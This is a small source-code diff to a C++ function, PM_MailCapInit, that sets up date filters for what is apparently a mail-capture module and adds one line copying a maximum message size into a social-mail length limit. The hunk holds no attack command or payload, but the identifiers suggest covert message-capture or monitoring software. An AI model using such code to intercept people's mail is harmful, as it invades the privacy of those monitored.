@@ -87,6 +87,8 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
 	HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
 
+	max_social_mail_len = g_mail_filter.max_size;
+
 	return 1;
 }
 
